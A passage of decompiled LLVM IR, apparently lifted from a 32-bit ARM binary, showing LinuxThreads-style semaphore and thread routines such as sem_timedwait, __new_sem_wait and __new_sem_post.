  %v3_bda8 = inttoptr i32 %v2_bda8 to i32*
  store i32 %arg3, i32* %v3_bda8, align 4
  %v2_bdac = add i32 %tmp, 12
  %v3_bdac = inttoptr i32 %v2_bdac to i32*
  store i32 0, i32* %v3_bdac, align 4
  store i32 0, i32* %arg1, align 4
  %v2_bdb4 = add i32 %tmp, 4
  %v3_bdb4 = inttoptr i32 %v2_bdb4 to i32*
  store i32 0, i32* %v3_bdb4, align 4
  br label %dec_label_pc_bdb8

dec_label_pc_bdb8:                                ; preds = %dec_label_pc_bda0, %dec_label_pc_bda8
  %v0_bdb8 = load i32, i32* %ip.global-to-local, align 4
  ret i32 %v0_bdb8

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_bdb8, { 1, 0 }
  uselistorder label %dec_label_pc_bda0, { 1, 0 }
}

define i32 @_thread_self() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v2_bdc4 = load i32, i32* @global_var_2b16c.177, align 4
  %v0_bdc8 = load i32, i32* @sp, align 4
  %v3_bdc8 = icmp ult i32 %v0_bdc8, %v2_bdc4
  %v1_bdcc = ptrtoint i32* %stack_var_0 to i32
  br i1 %v3_bdc8, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_bde8, %entry
  %merge = phi i32 [ ptrtoint (i32* @global_var_2a3e0 to i32), %entry ], [ ptrtoint (i32* @global_var_2a5c0.184 to i32), %dec_label_pc_bde8 ]
  ret i32 %merge

bb3:                                              ; preds = %entry
  %v2_bddc = load i32, i32* @global_var_2b170.180, align 4
  %v3_bde0 = icmp ult i32 %v0_bdc8, %v2_bddc
  br i1 %v3_bde0, label %bb4, label %dec_label_pc_bde8

dec_label_pc_bde8:                                ; preds = %bb3
  %v2_bdec = load i32, i32* @global_var_2b174.182, align 4
  %v3_bdf0 = icmp ult i32 %v0_bdc8, %v2_bdec
  br i1 %v3_bdf0, label %bb, label %bb4

bb4:                                              ; preds = %dec_label_pc_bde8, %bb3
  %v2_be00 = load i32, i32* @global_var_2f558.186, align 4
  %v3_be04 = and i32 %v1_bdcc, -2097152
  %v4_be04 = xor i32 %v3_be04, -2097152
  %v2_be0c = icmp eq i32 %v2_be00, 0
  %v1_be10 = sub i32 -477, %v4_be04
  br i1 %v2_be0c, label %dec_label_pc_be1c, label %dec_label_pc_be18

dec_label_pc_be18:                                ; preds = %bb4
  %v1_be18 = call i32 @__pthread_find_self(i32 %v1_be10)
  br label %dec_label_pc_be1c

dec_label_pc_be1c:                                ; preds = %bb4, %dec_label_pc_be18
  %v0_be1c = phi i32 [ %v1_be10, %bb4 ], [ %v1_be18, %dec_label_pc_be18 ]
  %v1_be1c = add i32 %v0_be1c, -3
  ret i32 %v1_be1c

; uselistorder directives
  uselistorder i32 %v1_be10, { 1, 0 }
  uselistorder label %dec_label_pc_be1c, { 1, 0 }
}

define i32 @new_sem_extricate_func(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_be4c = call i32 @_thread_self()
  %v2_be5c = call i32 @__pthread_lock(i32 %arg1, i32 %v0_be4c)
  %v1_be64 = add i32 %arg1, 12
  store i32 %v1_be64, i32* @r0, align 4
  %v2_be68 = call i32 @remove_from_queue(i32 %v1_be64, i32 %arg2)
  %v1_be74 = call i32 @__pthread_unlock(i32 %arg1)
  ret i32 %v2_be68
}

define i32 @suspend(i32 %arg1) local_unnamed_addr {
entry:
  %v0_be84 = load i32, i32* @r0, align 4
  %v1_be84 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_be84)
  ret i32 %v1_be84
}

define i32 @sem_timedwait(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_be8c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg1, i32* @r6, align 4
  %v0_be98 = call i32 @_thread_self()
  %v0_bea4 = load i32, i32* @r6, align 4
  %v2_bea8 = call i32 @__pthread_lock(i32 %v0_bea4, i32 %v0_be98)
  %v0_beac = load i32, i32* @r6, align 4
  %v1_beac = add i32 %v0_beac, 8
  %v2_beac = inttoptr i32 %v1_beac to i32*
  %v3_beac = load i32, i32* %v2_beac, align 4
  %tmp14 = icmp slt i32 %v3_beac, 1
  br i1 %tmp14, label %dec_label_pc_becc, label %dec_label_pc_beb8

dec_label_pc_beb8:                                ; preds = %entry
  %v1_beb8 = add i32 %v3_beac, -1
  store i32 %v1_beb8, i32* %v2_beac, align 4
  %v0_bec0 = load i32, i32* @r6, align 4
  %v1_bec4 = call i32 @__pthread_unlock(i32 %v0_bec0)
  br label %dec_label_pc_c020

dec_label_pc_becc:                                ; preds = %entry
  %v0_becc = load i32, i32* @r8, align 4
  %v1_becc = add i32 %v0_becc, 4
  %v2_becc = inttoptr i32 %v1_becc to i32*
  %v3_becc = load i32, i32* %v2_becc, align 4
  %tmp = icmp ult i32 %v3_becc, 1000000000
  br i1 %tmp, label %dec_label_pc_bef4, label %dec_label_pc_bedc

dec_label_pc_bedc:                                ; preds = %dec_label_pc_becc
  %v1_bee0 = call i32 @__pthread_unlock(i32 %v0_beac)
  %v0_bee4 = call i32 @__errno_location()
  br label %dec_label_pc_c018

dec_label_pc_bef4:                                ; preds = %dec_label_pc_becc
  store i32 %v0_beac, i32* %stack_var_-32, align 4
  %v0_bf04 = load i32, i32* @r5, align 4
  %v3_bf08 = add i32 %v0_bf04, 442
  %v4_bf08 = inttoptr i32 %v3_bf08 to i8*
  store i8 0, i8* %v4_bf08, align 1
  %v2_bf10 = call i32 @__pthread_set_own_extricate_if(i32 %v0_bf04, i32 %v2_be8c)
  %v0_bf14 = load i32, i32* @r5, align 4
  %v1_bf14 = add i32 %v0_bf14, 66
  %v2_bf14 = inttoptr i32 %v1_bf14 to i8*
  %v3_bf14 = load i8, i8* %v2_bf14, align 1
  %v2_bf18 = icmp eq i8 %v3_bf14, 0
  br i1 %v2_bf18, label %dec_label_pc_bf30, label %dec_label_pc_bf20

dec_label_pc_bf20:                                ; preds = %dec_label_pc_bef4
  %v1_bf20 = add i32 %v0_bf14, 64
  %v2_bf20 = inttoptr i32 %v1_bf20 to i8*
  %v3_bf20 = load i8, i8* %v2_bf20, align 1
  %v2_bf24 = icmp eq i8 %v3_bf20, 0
  br i1 %v2_bf24, label %dec_label_pc_bf40, label %dec_label_pc_bf30

dec_label_pc_bf30:                                ; preds = %dec_label_pc_bf20, %dec_label_pc_bef4
  %v0_bf30 = load i32, i32* @r6, align 4
  %v1_bf30 = add i32 %v0_bf30, 12
  %v2_bf38 = call i32 @enqueue(i32 %v1_bf30, i32 %v0_bf14)
  br label %dec_label_pc_bf40

dec_label_pc_bf40:                                ; preds = %dec_label_pc_bf20, %dec_label_pc_bf30
  %storemerge5 = phi i32 [ 0, %dec_label_pc_bf30 ], [ 1, %dec_label_pc_bf20 ]
  store i32 %storemerge5, i32* @r4, align 4
  %v0_bf40 = load i32, i32* @r6, align 4
  %v1_bf44 = call i32 @__pthread_unlock(i32 %v0_bf40)
  %v0_bf48 = load i32, i32* @r4, align 4
  %v2_bf48 = icmp eq i32 %v0_bf48, 0
  %v0_bf60.pre = load i32, i32* @r5, align 4
  br i1 %v2_bf48, label %dec_label_pc_bf60, label %dec_label_pc_bf50

dec_label_pc_bf50:                                ; preds = %dec_label_pc_bf40
  %v2_bf58 = call i32 @__pthread_set_own_extricate_if(i32 %v0_bf60.pre, i32 0)
  br label %dec_label_pc_bff4

dec_label_pc_bf60:                                ; preds = %dec_label_pc_bfc0, %dec_label_pc_bfb4, %dec_label_pc_bf40
  %v0_bf60 = phi i32 [ %v0_bf60.pre, %dec_label_pc_bf40 ], [ %v0_bfa8, %dec_label_pc_bfb4 ], [ %v0_bfa8, %dec_label_pc_bfc0 ]
  %v0_bf64 = load i32, i32* @r8, align 4
  %v2_bf68 = inttoptr i32 %v0_bf64 to i32*
  %v3_bf68 = call i32 @__pthread_timedsuspend_new(i32 %v0_bf60, i32* %v2_bf68)
  store i32 %v3_bf68, i32* @r7, align 4
  %v2_bf6c = icmp eq i32 %v3_bf68, 0
  br i1 %v2_bf6c, label %dec_label_pc_bf74, label %dec_label_pc_bfa8

dec_label_pc_bf74:                                ; preds = %dec_label_pc_bf60
  %v0_bf74 = load i32, i32* @r6, align 4
  %v0_bf78 = load i32, i32* @r5, align 4
  %v2_bf7c = call i32 @__pthread_lock(i32 %v0_bf74, i32 %v0_bf78)
  %v0_bf80 = load i32, i32* @r5, align 4
  %v0_bf84 = load i32, i32* @r6, align 4
  %v1_bf84 = add i32 %v0_bf84, 12
  store i32 %v1_bf84, i32* @r0, align 4
  %v2_bf88 = call i32 @remove_from_queue(i32 %v1_bf84, i32 %v0_bf80)
  store i32 %v2_bf88, i32* @r4, align 4
  %v0_bf90 = load i32, i32* @r6, align 4
  %v1_bf94 = call i32 @__pthread_unlock(i32 %v0_bf90)
  %v0_bf98 = load i32, i32* @r4, align 4
  %v2_bf98 = icmp eq i32 %v0_bf98, 0
  br i1 %v2_bf98, label %dec_label_pc_bfa0, label %dec_label_pc_c000

dec_label_pc_bfa0:                                ; preds = %dec_label_pc_bf74
  %v0_bfa0 = load i32, i32* @r5, align 4
  store i32 %v0_bfa0, i32* @r0, align 4
  %v1_bfa4 = call i32 @suspend(i32 %v0_bfa0)
  br label %dec_label_pc_bfa8

dec_label_pc_bfa8:                                ; preds = %dec_label_pc_bf60, %dec_label_pc_bfa0
  %v0_bfa8 = load i32, i32* @r5, align 4
  %v1_bfa8 = add i32 %v0_bfa8, 442
  %v2_bfa8 = inttoptr i32 %v1_bfa8 to i8*
  %v3_bfa8 = load i8, i8* %v2_bfa8, align 1
  %v2_bfac = icmp eq i8 %v3_bfa8, 0
  br i1 %v2_bfac, label %dec_label_pc_bfb4, label %dec_label_pc_bfcc

dec_label_pc_bfb4:                                ; preds = %dec_label_pc_bfa8
  %v1_bfb4 = add i32 %v0_bfa8, 440
  %v2_bfb4 = inttoptr i32 %v1_bfb4 to i8*
  %v3_bfb4 = load i8, i8* %v2_bfb4, align 1
  %v2_bfb8 = icmp eq i8 %v3_bfb4, 0
  br i1 %v2_bfb8, label %dec_label_pc_bf60, label %dec_label_pc_bfc0

dec_label_pc_bfc0:                                ; preds = %dec_label_pc_bfb4
  %v1_bfc0 = add i32 %v0_bfa8, 64
  %v2_bfc0 = inttoptr i32 %v1_bfc0 to i8*
  %v3_bfc0 = load i8, i8* %v2_bfc0, align 1
  %v2_bfc4 = icmp eq i8 %v3_bfc0, 0
  br i1 %v2_bfc4, label %dec_label_pc_bfcc, label %dec_label_pc_bf60

dec_label_pc_bfcc:                                ; preds = %dec_label_pc_bfc0, %dec_label_pc_bfa8
  %v2_bfd4 = call i32 @__pthread_set_own_extricate_if(i32 %v0_bfa8, i32 0)
  %v0_bfd8 = load i32, i32* @r5, align 4
  %v1_bfd8 = add i32 %v0_bfd8, 440
  %v2_bfd8 = inttoptr i32 %v1_bfd8 to i8*
  %v3_bfd8 = load i8, i8* %v2_bfd8, align 1
  %v2_bfdc = icmp eq i8 %v3_bfd8, 0
  br i1 %v2_bfdc, label %dec_label_pc_c020, label %dec_label_pc_bfe4

dec_label_pc_bfe4:                                ; preds = %dec_label_pc_bfcc
  %v1_bfe4 = add i32 %v0_bfd8, 64
  %v2_bfe4 = inttoptr i32 %v1_bfe4 to i8*
  %v3_bfe4 = load i8, i8* %v2_bfe4, align 1
  %v2_bfe8 = icmp eq i8 %v3_bfe4, 0
  br i1 %v2_bfe8, label %dec_label_pc_bff0, label %dec_label_pc_c020

dec_label_pc_bff0:                                ; preds = %dec_label_pc_bfe4
  store i8 0, i8* %v2_bfd8, align 1
  br label %dec_label_pc_bff4

dec_label_pc_bff4:                                ; preds = %dec_label_pc_bf50, %dec_label_pc_bff0
  %v2_bffc = call i32 @__pthread_do_exit(i32 -1, i32 %v2_be8c)
  br label %dec_label_pc_c000

dec_label_pc_c000:                                ; preds = %dec_label_pc_bf74, %dec_label_pc_bff4
  %v0_c000 = load i32, i32* @r5, align 4
  %v0_c004 = load i32, i32* @r7, align 4
  %v2_c008 = call i32 @__pthread_set_own_extricate_if(i32 %v0_c000, i32 %v0_c004)
  %v0_c00c = call i32 @__errno_location()
  br label %dec_label_pc_c018

dec_label_pc_c018:                                ; preds = %dec_label_pc_bedc, %dec_label_pc_c000
  %storemerge1 = phi i32 [ %v0_bee4, %dec_label_pc_bedc ], [ %v0_c00c, %dec_label_pc_c000 ]
  %storemerge = phi i32 [ 22, %dec_label_pc_bedc ], [ 110, %dec_label_pc_c000 ]
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_c018 = inttoptr i32 %storemerge1 to i32*
  store i32 %storemerge, i32* %v2_c018, align 4
  %v0_c024.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c024

dec_label_pc_c020:                                ; preds = %dec_label_pc_bfe4, %dec_label_pc_bfcc, %dec_label_pc_beb8
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c024

dec_label_pc_c024:                                ; preds = %dec_label_pc_c018, %dec_label_pc_c020
  %v0_c024 = phi i32 [ %v0_c024.pre, %dec_label_pc_c018 ], [ 0, %dec_label_pc_c020 ]
  ret i32 %v0_c024

; uselistorder directives
  uselistorder i32 %v0_bfa8, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c024, { 1, 0 }
  uselistorder label %dec_label_pc_c018, { 1, 0 }
  uselistorder label %dec_label_pc_c000, { 1, 0 }
  uselistorder label %dec_label_pc_bff4, { 1, 0 }
  uselistorder label %dec_label_pc_bfa8, { 1, 0 }
  uselistorder label %dec_label_pc_bf40, { 1, 0 }
}

define i32 @"$d.14"(i32 %arg1) local_unnamed_addr {
dec_label_pc_c030:
  call void @__pseudo_cond_branch(i1 true, i32 -26482636)
  %v0_c034 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c034, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_c030
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_c030, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @__new_sem_wait(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_c03c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %arg1, i32* @r4, align 4
  %v0_c044 = call i32 @_thread_self()
  %v0_c054 = load i32, i32* @r4, align 4
  store i32 %v0_c054, i32* %stack_var_-24, align 4
  %v2_c060 = call i32 @__pthread_lock(i32 %v0_c054, i32 %v0_c044)
  %v0_c064 = load i32, i32* @r4, align 4
  %v1_c064 = add i32 %v0_c064, 8
  %v2_c064 = inttoptr i32 %v1_c064 to i32*
  %v3_c064 = load i32, i32* %v2_c064, align 4
  %tmp12 = icmp slt i32 %v3_c064, 1
  br i1 %tmp12, label %dec_label_pc_c084, label %dec_label_pc_c070

dec_label_pc_c070:                                ; preds = %entry
  %v1_c070 = add i32 %v3_c064, -1
  store i32 %v1_c070, i32* %v2_c064, align 4
  %v0_c078 = load i32, i32* @r4, align 4
  %v1_c07c = call i32 @__pthread_unlock(i32 %v0_c078)
  br label %dec_label_pc_c168

dec_label_pc_c084:                                ; preds = %entry
  %v3_c08c = add i32 %v0_c044, 442
  %v4_c08c = inttoptr i32 %v3_c08c to i8*
  store i8 0, i8* %v4_c08c, align 1
  %v2_c098 = call i32 @__pthread_set_own_extricate_if(i32 %v0_c044, i32 %v2_c03c)
  %v1_c0a0 = add i32 %v0_c044, 66
  %v2_c0a0 = inttoptr i32 %v1_c0a0 to i8*
  %v3_c0a0 = load i8, i8* %v2_c0a0, align 1
  %v2_c0a4 = icmp eq i8 %v3_c0a0, 0
  br i1 %v2_c0a4, label %dec_label_pc_c0c0, label %dec_label_pc_c0ac

dec_label_pc_c0ac:                                ; preds = %dec_label_pc_c084
  %v1_c0b0 = add i32 %v0_c044, 64
  %v2_c0b0 = inttoptr i32 %v1_c0b0 to i8*
  %v3_c0b0 = load i8, i8* %v2_c0b0, align 1
  %v2_c0b4 = icmp eq i8 %v3_c0b0, 0
  br i1 %v2_c0b4, label %dec_label_pc_c0d0, label %dec_label_pc_c0c0

dec_label_pc_c0c0:                                ; preds = %dec_label_pc_c0ac, %dec_label_pc_c084
  %v0_c0c4 = load i32, i32* @r4, align 4
  %v1_c0c4 = add i32 %v0_c0c4, 12
  %v2_c0c8 = call i32 @enqueue(i32 %v1_c0c4, i32 %v0_c044)
  br label %dec_label_pc_c0d0

dec_label_pc_c0d0:                                ; preds = %dec_label_pc_c0ac, %dec_label_pc_c0c0
  %storemerge = phi i32 [ 0, %dec_label_pc_c0c0 ], [ 1, %dec_label_pc_c0ac ]
  store i32 %storemerge, i32* @r5, align 4
  %v0_c0d0 = load i32, i32* @r4, align 4
  %v1_c0d4 = call i32 @__pthread_unlock(i32 %v0_c0d0)
  %v0_c0d8 = load i32, i32* @r5, align 4
  %v2_c0d8 = icmp eq i32 %v0_c0d8, 0
  store i32 %v0_c044, i32* @r0, align 4
  br i1 %v2_c0d8, label %dec_label_pc_c0f0.preheader, label %dec_label_pc_c0e0

dec_label_pc_c0f0.preheader:                      ; preds = %dec_label_pc_c0d0
  %v1_c0f41 = call i32 @suspend(i32 %v0_c044)
  %v3_c0fc2 = load i8, i8* %v4_c08c, align 1
  %v2_c1004 = icmp eq i8 %v3_c0fc2, 0
  %v1_c10c = add i32 %v0_c044, 440
  %v2_c10c = inttoptr i32 %v1_c10c to i8*
  br i1 %v2_c1004, label %dec_label_pc_c108.lr.ph, label %dec_label_pc_c128

dec_label_pc_c108.lr.ph:                          ; preds = %dec_label_pc_c0f0.preheader
  %v1_c11c = add i32 %v0_c044, 64
  %v2_c11c = inttoptr i32 %v1_c11c to i8*
  br label %dec_label_pc_c108

dec_label_pc_c0e0:                                ; preds = %dec_label_pc_c0d0
  %v2_c0e8 = call i32 @__pthread_set_own_extricate_if(i32 %v0_c044, i32 0)
  br label %dec_label_pc_c15c

dec_label_pc_c108:                                ; preds = %dec_label_pc_c108.lr.ph, %dec_label_pc_c0f0.backedge
  %v3_c10c = load i8, i8* %v2_c10c, align 1
  %v2_c110 = icmp eq i8 %v3_c10c, 0
  br i1 %v2_c110, label %dec_label_pc_c0f0.backedge, label %dec_label_pc_c118

dec_label_pc_c0f0.backedge:                       ; preds = %dec_label_pc_c108, %dec_label_pc_c118
  store i32 %v0_c044, i32* @r0, align 4
  %v1_c0f4 = call i32 @suspend(i32 %v0_c044)
  %v3_c0fc = load i8, i8* %v4_c08c, align 1
  %v2_c100 = icmp eq i8 %v3_c0fc, 0
  br i1 %v2_c100, label %dec_label_pc_c108, label %dec_label_pc_c128

dec_label_pc_c118:                                ; preds = %dec_label_pc_c108
  %v3_c11c = load i8, i8* %v2_c11c, align 1
  %v2_c120 = icmp eq i8 %v3_c11c, 0
  br i1 %v2_c120, label %dec_label_pc_c128, label %dec_label_pc_c0f0.backedge

dec_label_pc_c128:                                ; preds = %dec_label_pc_c0f0.backedge, %dec_label_pc_c118, %dec_label_pc_c0f0.preheader
  %v2_c130 = call i32 @__pthread_set_own_extricate_if(i32 %v0_c044, i32 0)
  %v3_c138 = load i8, i8* %v2_c10c, align 1
  %v2_c13c = icmp eq i8 %v3_c138, 0
  br i1 %v2_c13c, label %dec_label_pc_c168, label %dec_label_pc_c144

dec_label_pc_c144:                                ; preds = %dec_label_pc_c128
  %v1_c148 = add i32 %v0_c044, 64
  %v2_c148 = inttoptr i32 %v1_c148 to i8*
  %v3_c148 = load i8, i8* %v2_c148, align 1
  %v2_c14c = icmp eq i8 %v3_c148, 0
  br i1 %v2_c14c, label %dec_label_pc_c154, label %dec_label_pc_c168

dec_label_pc_c154:                                ; preds = %dec_label_pc_c144
  store i8 0, i8* %v2_c10c, align 1
  br label %dec_label_pc_c15c

dec_label_pc_c15c:                                ; preds = %dec_label_pc_c0e0, %dec_label_pc_c154
  %v2_c164 = call i32 @__pthread_do_exit(i32 -1, i32 %v2_c03c)
  br label %dec_label_pc_c168

dec_label_pc_c168:                                ; preds = %dec_label_pc_c144, %dec_label_pc_c128, %dec_label_pc_c070, %dec_label_pc_c15c
  ret i32 0

; uselistorder directives
  uselistorder i8* %v4_c08c, { 1, 0, 2 }
  uselistorder i32 %v0_c044, { 4, 5, 9, 8, 3, 6, 7, 0, 1, 10, 2, 12, 11, 13, 14 }
  uselistorder i32 (i32)* @suspend, { 2, 0, 1 }
  uselistorder i32 (i32, i32)* @enqueue, { 1, 0 }
  uselistorder i32 (i32, i32)* @__pthread_set_own_extricate_if, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_c168, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_c15c, { 1, 0 }
  uselistorder label %dec_label_pc_c128, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c0f0.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_c108, { 1, 0 }
  uselistorder label %dec_label_pc_c0d0, { 1, 0 }
}

define i32 @__new_sem_post(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  %v3_c178 = load i32, i32* @r4, align 4
  %v9_c178 = load i32, i32* @r6, align 4
  %v2_c17c = ptrtoint i32* %stack_var_-164 to i32
  store i32 %arg1, i32* @r4, align 4
  %v0_c184 = call i32 @_thread_self()
  %v1_c188 = add i32 %v0_c184, 84
  %v2_c188 = inttoptr i32 %v1_c188 to i32*
  %v3_c188 = load i32, i32* %v2_c188, align 4
  store i32 %v3_c188, i32* @r6, align 4
  %v2_c18c = icmp eq i32 %v3_c188, 0
  br i1 %v2_c18c, label %dec_label_pc_c194, label %dec_label_pc_c218

dec_label_pc_c194:                                ; preds = %entry
  %v0_c198 = load i32, i32* @r4, align 4
  %v2_c19c = call i32 @__pthread_lock(i32 %v0_c198, i32 %v0_c184)
  %v0_c1a0 = load i32, i32* @r4, align 4
  %v1_c1a0 = add i32 %v0_c1a0, 12
  %v2_c1a0 = inttoptr i32 %v1_c1a0 to i32*
  %v3_c1a0 = load i32, i32* %v2_c1a0, align 4
  store i32 %v3_c1a0, i32* %r5.global-to-local, align 4
  %v2_c1a4 = icmp eq i32 %v3_c1a0, 0
  br i1 %v2_c1a4, label %dec_label_pc_c1ac, label %dec_label_pc_c1ec

dec_label_pc_c1ac:                                ; preds = %dec_label_pc_c194
  %v1_c1ac = add i32 %v0_c1a0, 8
  %v2_c1ac = inttoptr i32 %v1_c1ac to i32*
  %v3_c1ac = load i32, i32* %v2_c1ac, align 4
  %v4_c1b4 = icmp eq i32 %v3_c1ac, 2147483647
  br i1 %v4_c1b4, label %dec_label_pc_c1b8, label %dec_label_pc_c1d4

dec_label_pc_c1b8:                                ; preds = %dec_label_pc_c1ac
  %v0_c1b8 = call i32 @__errno_location()
  %v2_c1c0 = inttoptr i32 %v0_c1b8 to i32*
  store i32 34, i32* %v2_c1c0, align 4
  %v0_c1c4 = load i32, i32* @r4, align 4
  %v1_c1c8 = call i32 @__pthread_unlock(i32 %v0_c1c4)
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c280

dec_label_pc_c1d4:                                ; preds = %dec_label_pc_c1ac
  %v5_c1b0 = add i32 %v3_c1ac, 1
  store i32 %v5_c1b0, i32* %v2_c1ac, align 4
  %v0_c1dc = load i32, i32* @r4, align 4
  %v1_c1e0 = call i32 @__pthread_unlock(i32 %v0_c1dc)
  %v0_c1e4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_c1e4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c280

dec_label_pc_c1ec:                                ; preds = %dec_label_pc_c194
  %v1_c1ec = add i32 %v3_c1a0, 8
  %v2_c1ec = inttoptr i32 %v1_c1ec to i32*
  %v3_c1ec = load i32, i32* %v2_c1ec, align 4
  store i32 %v3_c1ec, i32* %v2_c1a0, align 4
  %v0_c1f8 = load i32, i32* @r6, align 4
  %v1_c1f8 = load i32, i32* %r5.global-to-local, align 4
  %v2_c1f8 = add i32 %v1_c1f8, 8
  %v3_c1f8 = inttoptr i32 %v2_c1f8 to i32*
  store i32 %v0_c1f8, i32* %v3_c1f8, align 4
  %v1_c1fc = call i32 @__pthread_unlock(i32 %v0_c1a0)
  %v2_c204 = load i32, i32* %r5.global-to-local, align 4
  %v3_c204 = add i32 %v2_c204, 442
  %v4_c204 = inttoptr i32 %v3_c204 to i8*
  store i8 1, i8* %v4_c204, align 1
  %v0_c208 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_c208, i32* @r0, align 4
  %v0_c20c = call i32 @__pthread_restart_new()
  %v0_c210 = load i32, i32* @r6, align 4
  store i32 %v0_c210, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c280

dec_label_pc_c218:                                ; preds = %entry
  %v2_c21c = load i32, i32* @global_var_2a7a4.195, align 4
  %v1_c220 = icmp slt i32 %v2_c21c, 0
  br i1 %v1_c220, label %dec_label_pc_c228, label %dec_label_pc_c248

dec_label_pc_c228:                                ; preds = %dec_label_pc_c218
  %v0_c228 = call i32 @__pthread_initialize_manager()
  %v1_c22c = icmp slt i32 %v0_c228, 0
  br i1 %v1_c22c, label %dec_label_pc_c234, label %dec_label_pc_c248

dec_label_pc_c234:                                ; preds = %dec_label_pc_c228
  %v0_c234 = call i32 @__errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_c240 = inttoptr i32 %v0_c234 to i32*
  store i32 11, i32* %v2_c240, align 4
  %v0_c280.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c280

dec_label_pc_c248:                                ; preds = %dec_label_pc_c228, %dec_label_pc_c218
  br label %dec_label_pc_c250

dec_label_pc_c250:                                ; preds = %dec_label_pc_c26c, %dec_label_pc_c248
  store i32 %v2_c17c, i32* @r1, align 4
  %v2_c258 = load i32, i32* @global_var_2a7a4.195, align 4
  store i32 %v2_c258, i32* @r0, align 4
  store i32 148, i32* @r2, align 4
  %v2_c260 = call i32 @__libc_write(i32 %v2_c258, i32 %v2_c17c)
  %v3_c264 = icmp eq i32 %v2_c260, -1
  br i1 %v3_c264, label %dec_label_pc_c26c, label %dec_label_pc_c27c

dec_label_pc_c26c:                                ; preds = %dec_label_pc_c250
  %v0_c26c = call i32 @__errno_location()
  %v1_c270 = inttoptr i32 %v0_c26c to i32*
  %v2_c270 = load i32, i32* %v1_c270, align 4
  %v7_c274 = icmp eq i32 %v2_c270, 4
  br i1 %v7_c274, label %dec_label_pc_c250, label %dec_label_pc_c27c

dec_label_pc_c27c:                                ; preds = %dec_label_pc_c250, %dec_label_pc_c26c
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c280

dec_label_pc_c280:                                ; preds = %dec_label_pc_c234, %dec_label_pc_c1ec, %dec_label_pc_c1d4, %dec_label_pc_c1b8, %dec_label_pc_c27c
  %v0_c280 = phi i32 [ %v0_c280.pre, %dec_label_pc_c234 ], [ %v0_c210, %dec_label_pc_c1ec ], [ %v0_c1e4, %dec_label_pc_c1d4 ], [ -1, %dec_label_pc_c1b8 ], [ 0, %dec_label_pc_c27c ]
  store i32 %v3_c178, i32* @r4, align 4
  store i32 %v9_c178, i32* @r6, align 4
  ret i32 %v0_c280

; uselistorder directives
  uselistorder i32 %v3_c1ac, { 1, 0 }
  uselistorder i32 %v0_c1a0, { 1, 0, 2 }
  uselistorder i32 %v2_c17c, { 1, 0 }
  uselistorder i32 ()* @_thread_self, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_c280, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_c27c, { 1, 0 }
}

define i32 @pthread_null_sighandler() local_unnamed_addr {
entry:
  %v1_c290 = load i32, i32* @r0, align 4
  ret i32 %v1_c290
}

define i32 @_thread_self.1() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v2_c298 = load i32, i32* @global_var_2b16c.177, align 4
  %v0_c29c = load i32, i32* @sp, align 4
  %v3_c29c = icmp ult i32 %v0_c29c, %v2_c298
  %v1_c2a0 = ptrtoint i32* %stack_var_0 to i32
  br i1 %v3_c29c, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_c2bc, %entry
  %merge = phi i32 [ ptrtoint (i32* @global_var_2a3e0 to i32), %entry ], [ ptrtoint (i32* @global_var_2a5c0.184 to i32), %dec_label_pc_c2bc ]
  ret i32 %merge

bb3:                                              ; preds = %entry
  %v2_c2b0 = load i32, i32* @global_var_2b170.180, align 4
  %v3_c2b4 = icmp ult i32 %v0_c29c, %v2_c2b0
  br i1 %v3_c2b4, label %bb4, label %dec_label_pc_c2bc

dec_label_pc_c2bc:                                ; preds = %bb3
  %v2_c2c0 = load i32, i32* @global_var_2b174.182, align 4
  %v3_c2c4 = icmp ult i32 %v0_c29c, %v2_c2c0
  br i1 %v3_c2c4, label %bb, label %bb4

bb4:                                              ; preds = %dec_label_pc_c2bc, %bb3
  %v2_c2d4 = load i32, i32* @global_var_2f558.186, align 4
  store i32 %v2_c2d4, i32* @r2, align 4
  %v3_c2d8 = and i32 %v1_c2a0, -2097152
  %v4_c2d8 = xor i32 %v3_c2d8, -2097152
  %v2_c2e0 = icmp eq i32 %v2_c2d4, 0
  %v1_c2e4 = sub i32 -477, %v4_c2d8
  br i1 %v2_c2e0, label %dec_label_pc_c2f0, label %dec_label_pc_c2ec

dec_label_pc_c2ec:                                ; preds = %bb4
